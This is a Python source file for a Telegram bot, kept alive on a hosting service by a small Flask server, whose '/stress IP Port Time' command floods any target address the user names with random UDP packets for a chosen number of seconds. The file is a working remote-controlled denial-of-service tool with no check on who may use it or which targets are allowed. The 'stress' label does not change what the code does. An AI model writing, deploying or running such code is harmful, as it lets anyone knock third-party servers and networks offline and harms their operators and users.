import os
import socket
import random
import time
import threading
from flask import Flask
from telebot import TeleBot
from dotenv import load_dotenv

# --- 1. THE RENDER FIX (Flask Web Server) ---
app = Flask(__name__)

@app.route('/')
def home():
    return "Bot is running!"

def run_web_server():
    # Render provides a 'PORT' environment variable, default to 10000
    port = int(os.environ.get("PORT", 10000))
    app.run(host='0.0.0.0', port=port)

# --- 2. BOT LOGIC ---
load_dotenv()
TOKEN = os.getenv("BOT_TOKEN")
bot = TeleBot(TOKEN)

def udp_flood(target_ip, target_port, duration, chat_id, message_id):
    client = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    bytes_payload = random._urandom(1024)
    timeout = time.time() + duration
    sent = 0
    while time.time() < timeout:
        try:
            client.sendto(bytes_payload, (target_ip, target_port))
            sent += 1
        except:
            break
    
    bot.edit_message_text(f"✅ **Done!** Sent `{sent}` packets.", chat_id, message_id, parse_mode='Markdown')

@bot.message_handler(commands=['stress'])
def handle_stress(message):
    try:
        _, ip, port, sec = message.text.split()
        sent_msg = bot.reply_to(message, "🚀 **Starting...**", parse_mode='Markdown')
        threading.Thread(target=udp_flood, args=(ip, int(port), int(sec), message.chat.id, sent_msg.message_id)).start()
    except:
        bot.reply_to(message, "Usage: `/stress IP Port Time`")

# --- 3. MAIN EXECUTION ---
if __name__ == "__main__":
    # Start the Flask server in a separate thread
    threading.Thread(target=run_web_server, daemon=True).start()
    
    print("Web server started. Starting Bot polling...")
    bot.infinity_polling()
